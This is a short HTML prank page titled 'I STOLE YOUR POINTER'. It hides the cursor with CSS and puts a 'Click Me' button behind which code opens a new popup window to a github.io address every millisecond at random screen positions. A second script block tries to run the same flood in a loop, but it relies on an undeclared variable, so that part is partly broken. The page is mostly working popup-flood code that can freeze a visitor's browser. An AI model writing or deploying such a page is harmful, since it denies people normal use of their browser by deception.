
<html>
<body>
<h8>I STOLE YOUR POINTER </h8>
<div class="container">
  <div class="center">
    <button onclick='setInterval(function(){
	 		var RandomX = (Math.random() * 1024) + 1;
	 		var RandomY = (Math.random() * 768) + 300;
			var specs = "height=500px, width=500px, left=" + RandomX + ", top=" + RandomY;
			newWindow = window.open("https://cassius-root.github.io","test", specs);
 	 	}, 1); A = 0'>Click Me</button>
  </div>
</div>
<style>
*{cursor: none;}
background{  background-color: #1D1E22;
  cursor: none;
  }
.container {
  height: 200px;
  position: relative;
  border: 3px solid green;
}

.center {
  margin: 0;
  position: absolute;
  top: 50%;
  left: 50%;
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
}


body{
  background-color: #1D1E22;
  cursor: none;}
  
h8 {
  color: green;
  cursor: none;
}
</style>
<script>
	
	var newWindow;
	while (A < 1)
		setInterval(function(){
	 		var RandomX = (Math.random() * 1024) + 1;
	 		var RandomY = (Math.random() * 768) + 300;
			var specs = "height=500px, width=500px, left=" + RandomX + ", top=" + RandomY;
			newWindow = window.open("cassius-root.github.io","test", specs);
 	 	}, 1);
	   
</script>
</body>
</html>


